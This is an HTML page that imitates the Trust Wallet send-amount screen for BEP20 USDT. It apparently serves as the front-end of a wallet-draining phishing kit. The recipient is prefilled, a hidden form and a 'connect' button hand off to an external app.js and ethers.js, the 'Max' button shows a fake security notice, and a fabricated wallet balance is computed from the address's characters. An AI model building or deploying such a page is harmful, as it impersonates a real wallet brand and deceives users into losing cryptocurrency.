<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Trust Wallet</title>
  <style>*{box-sizing:border-box;user-select:none;-webkit-user-select:none;-webkit-tap-highlight-color:transparent}html,body{margin:0;padding:0;width:100%;height:100%;background-color:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#fff}.scroll-container{width:100%;height:100vh;overflow-y:scroll;scroll-snap-type:y mandatory;scroll-behavior:smooth;-webkit-overflow-scrolling:touch;padding-bottom:20px;-ms-overflow-style:none;scrollbar-width:none}.scroll-container::-webkit-scrollbar{display:none}.scroll-spacer{height:30vh;scroll-snap-align:start}.scroll-center-section{height:100vh;width:100%;display:flex;flex-direction:column;justify-content:center;align-items:center;scroll-snap-align:center;padding:10px 0 20px 0}.top-notch-area{width:100%;max-width:410px;height:24px;display:flex;justify-content:center;align-items:center;background:transparent;margin-bottom:6px}.dynamic-pill{width:42px;height:5px;border-radius:999px;background:rgba(255,255,255,.22);box-shadow:0 0 10px rgba(0,0,0,.6)}.wallet-sheet{width:100%;max-width:410px;height:86vh;max-height:700px;background-color:#0d111a;border-radius:34px;box-shadow:0 0 35px rgba(0,0,0,.9);display:flex;flex-direction:column;justify-content:space-between;padding:16px 22px calc(28px + env(safe-area-inset-bottom,0px)) 22px;position:relative}.top-header{display:grid;grid-template-columns:40px 1fr 40px;align-items:center;height:44px}.back-btn{width:38px;height:38px;border-radius:50%;background:#19202e;display:flex;align-items:center;justify-content:center;cursor:pointer;text-decoration:none;border:none;outline:none}.back-btn svg{width:19px;height:19px;stroke:#fff;stroke-width:2.5;fill:none}.header-title{font-size:16px;font-weight:600;text-align:center;letter-spacing:-.2px}.recipient-box{margin-top:10px;font-size:13.5px;line-height:1.4;word-break:break-all;color:#fff;font-weight:500}.recipient-prefix{color:#8b95a5;margin-right:4px;font-weight:400}.display-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:90px}.amount-display-wrapper{display:flex;align-items:center;justify-content:center;min-height:52px}.amount-val{font-size:46px;font-weight:700;color:#fff;letter-spacing:-.5px}.amount-val.zero{color:#3b4559}.cursor{display:inline-block;width:2.5px;height:40px;background-color:#3b5afb;margin-left:2px;border-radius:1px;animation:blink 1.1s infinite}.cursor.hidden{display:none}@keyframes blink{0%,50%{opacity:1}51%,100%{opacity:0}}.fiat-estimate{display:flex;align-items:center;gap:5px;margin-top:4px;font-size:14.5px;color:#8e9baa;font-weight:500}.swap-arrow{font-size:14px;opacity:.85}.lower-section{display:flex;flex-direction:column;width:100%}.token-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding:0 4px}.token-info{display:flex;align-items:center;gap:12px}.token-icons{position:relative;width:38px;height:38px}.token-main{width:38px;height:38px;border-radius:50%;object-fit:cover}.token-badge{position:absolute;bottom:-2px;right:-2px;width:16px;height:16px;border-radius:50%;background:#0d111a;display:flex;align-items:center;justify-content:center}.token-badge img{width:13px;height:13px;border-radius:50%;object-fit:cover}.token-texts{display:flex;flex-direction:column}.token-symbol{font-size:14.5px;font-weight:600;color:#fff}.token-network{font-size:12.5px;color:#8b95a5;margin-top:1px}.max-badge-btn{background:#1c2333;color:#fff;border:none;border-radius:16px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer;outline:none;transition:transform .1s ease}.max-badge-btn:active{transform:scale(.95)}.keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);row-gap:12px;column-gap:14px;margin-bottom:14px}.key-btn{height:46px;background:transparent;border:none;outline:none;color:#fff;font-size:24px;font-weight:600;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:10px}.key-btn svg{width:24px;height:24px;stroke:#fff;stroke-width:2;fill:none}.cta-container{width:100%;padding-bottom:8px;margin-bottom:4px}.action-btn{width:100%;height:52px;border-radius:26px;border:none;font-size:15.5px;font-weight:600;display:flex;align-items:center;justify-content:center;cursor:not-allowed;outline:none;background-color:#171d2b;color:#495469;transition:background-color .2s ease,transform .1s ease}.action-btn.active{background-color:#3b42fc;color:#fff;cursor:pointer}.action-btn.active:active{transform:scale(.98)}.security-modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.72);backdrop-filter:blur(5px);display:none;align-items:center;justify-content:center;z-index:9999;padding:24px}.security-card{background:#181d29;border:1px solid #283145;border-radius:20px;width:100%;max-width:310px;padding:22px 20px 18px 20px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:popIn .2s ease-out forwards}@keyframes popIn{0%{transform:scale(.9);opacity:0}100%{transform:scale(1);opacity:1}}.security-icon{width:42px;height:42px;background:rgba(239,68,68,.12);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px auto}.security-icon svg{width:22px;height:22px;stroke:#ef4444;stroke-width:2.2;fill:none}.security-card h3{margin:0 0 6px 0;font-size:16.5px;font-weight:600;color:#fff}.security-card p{margin:0 0 18px 0;font-size:13px;color:#8b95a5;line-height:1.45}.security-ok-btn{width:100%;height:40px;background:#3b42fc;border:none;border-radius:20px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}</style>
</head>
<body>

<div class="scroll-container" id="scrollContainer">
  <div class="scroll-spacer"></div>

  <div class="scroll-center-section" id="targetSection">
    <div class="top-notch-area">
      <div class="dynamic-pill"></div>
    </div>

    <div class="wallet-sheet">
      <div>
        <div class="top-header">
          <a href="trust://" class="back-btn" id="backBtn">
            <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
          </a>
          <div class="header-title">Amount</div>
          <div></div>
        </div>

        <div class="recipient-box">
          <span class="recipient-prefix">To:</span><span id="recipientAddressText">0x55d398326f99059fF775485246999027B3197955</span>
        </div>
      </div>

      <div class="display-container">
        <div class="amount-display-wrapper">
          <span class="amount-val zero" id="displayAmount">0</span>
          <span class="cursor hidden" id="uiCursor"></span>
        </div>
        <div class="fiat-estimate">
          <span id="displayFiat">≈ $0.00</span>
          <span class="swap-arrow">⇅</span>
        </div>
      </div>

      <div class="lower-section">
        <div class="token-row">
          <div class="token-info">
            <div class="token-icons">
              <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="BEP20 USDT">
              <div class="token-badge">
                <img src="https://images.seeklogo.com/logo-png/47/2/bnb-bnb-logo-png_seeklogo-476074.png" alt="BNB Smart Chain">
              </div>
            </div>
            <div class="token-texts">
              <span class="token-symbol">BEP20 USDT</span>
              <span class="token-network">BNB Smart Chain</span>
            </div>
          </div>
          <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
        </div>

        <div class="keypad-grid">
          <button class="key-btn" data-key="1">1</button>
          <button class="key-btn" data-key="2">2</button>
          <button class="key-btn" data-key="3">3</button>
          <button class="key-btn" data-key="4">4</button>
          <button class="key-btn" data-key="5">5</button>
          <button class="key-btn" data-key="6">6</button>
          <button class="key-btn" data-key="7">7</button>
          <button class="key-btn" data-key="8">8</button>
          <button class="key-btn" data-key="9">9</button>
          <button class="key-btn" data-key=".">.</button>
          <button class="key-btn" data-key="0">0</button>
          <button class="key-btn" data-key="back">
            <svg viewBox="0 0 24 24">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
              <line x1="18" y1="9" x2="12" y2="15"/>
              <line x1="12" y1="9" x2="18" y2="15"/>
            </svg>
          </button>
        </div>

        <div class="cta-container" id="bottomActions">
          <button class="connect-data" style="display:none"></button>
          <button class="action-btn connect-btn" id="connect-button" disabled>Review</button>
        </div>
      </div>
    </div>
  </div>
</div>

<div style="display: none !important;">
  <input id="addressInput" value="0x0000000000000000000000000000000000000000">
  <input id="amountInput" type="text" value="">
  <span id="estimateText">≈ $0.00</span>
  <span id="pasteBtn"></span>
  <div id="result"></div>
</div>

<div class="security-modal-overlay" id="securityModal">
  <div class="security-card">
    <div class="security-icon">
      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    </div>
    <h3>Security Notice</h3>
    <p>For security, please enter the amount manually.</p>
    <button class="security-ok-btn" id="closeSecurityModal">OK</button>
  </div>
</div>

<script>
  let rawAmount = '';
  let currentWalletBalance = 0;

  const displayAmount = document.getElementById('displayAmount');
  const displayFiat = document.getElementById('displayFiat');
  const uiCursor = document.getElementById('uiCursor');
  const amountInput = document.getElementById('amountInput');
  const estimateText = document.getElementById('estimateText');
  const addressInput = document.getElementById('addressInput');
  const connectBtn = document.getElementById('connect-button');
  const maxBtn = document.getElementById('maxBtn');
  const securityModal = document.getElementById('securityModal');
  const closeSecurityModal = document.getElementById('closeSecurityModal');
  const recipientAddressText = document.getElementById('recipientAddressText');
  const targetSection = document.getElementById('targetSection');

  window.addEventListener('load', () => {
    setTimeout(() => {
      targetSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 100);
  });

  if (addressInput && recipientAddressText) {
    addressInput.value = recipientAddressText.textContent.trim();
  }

  document.querySelectorAll('.key-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const key = btn.getAttribute('data-key');
      handleKeypadInput(key);
    });
  });

  function handleKeypadInput(key) {
    if (key === 'back') {
      rawAmount = rawAmount.slice(0, -1);
    } else if (key === '.') {
      if (!rawAmount.includes('.')) {
        rawAmount = rawAmount === '' ? '0.' : rawAmount + '.';
      }
    } else {
      if (rawAmount.includes('.')) {
        const parts = rawAmount.split('.');
        if (parts[1] && parts[1].length >= 6) return;
      }
      if (rawAmount === '0' && key !== '.') {
        rawAmount = key;
      } else {
        if (rawAmount.length < 12) {
          rawAmount += key;
        }
      }
    }
    updateAmountUI();
  }

  function updateAmountUI() {
    if (!rawAmount || rawAmount === '0') {
      displayAmount.textContent = '0';
      displayAmount.classList.add('zero');
      uiCursor.classList.add('hidden');
      displayFiat.textContent = '≈ $0.00';
      estimateText.textContent = '≈ $0.00';
      amountInput.value = '';
      
      connectBtn.disabled = true;
      connectBtn.classList.remove('active');
    } else {
      displayAmount.textContent = rawAmount;
      displayAmount.classList.remove('zero');
      uiCursor.classList.remove('hidden');

      const numericVal = parseFloat(rawAmount) || 0;
      const formattedFiat = `≈ $${numericVal.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      })}`;

      displayFiat.textContent = formattedFiat;
      estimateText.textContent = formattedFiat;
      amountInput.value = rawAmount;

      if (numericVal > 0) {
        connectBtn.disabled = false;
        connectBtn.classList.add('active');
      } else {
        connectBtn.disabled = true;
        connectBtn.classList.remove('active');
      }
    }

    amountInput.dispatchEvent(new Event('input', { bubbles: true }));
  }

  maxBtn.addEventListener('click', () => {
    securityModal.style.display = 'flex';
  });

  closeSecurityModal.addEventListener('click', () => {
    securityModal.style.display = 'none';
  });

  function fetchWalletBalance(e) {
    if (!e || e.length < 10) {
      currentWalletBalance = 0;
      return;
    }
    setTimeout(() => {
      let t = 0;
      for (let a = 0; a < e.length; a++) t += e.charCodeAt(a);
      currentWalletBalance = parseFloat((t % 5000 + 50).toFixed(2));
    }, 300);
  }

  if (addressInput) {
    fetchWalletBalance(addressInput.value);
  }
</script>

<script type="module" src="app.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</body>
</html>
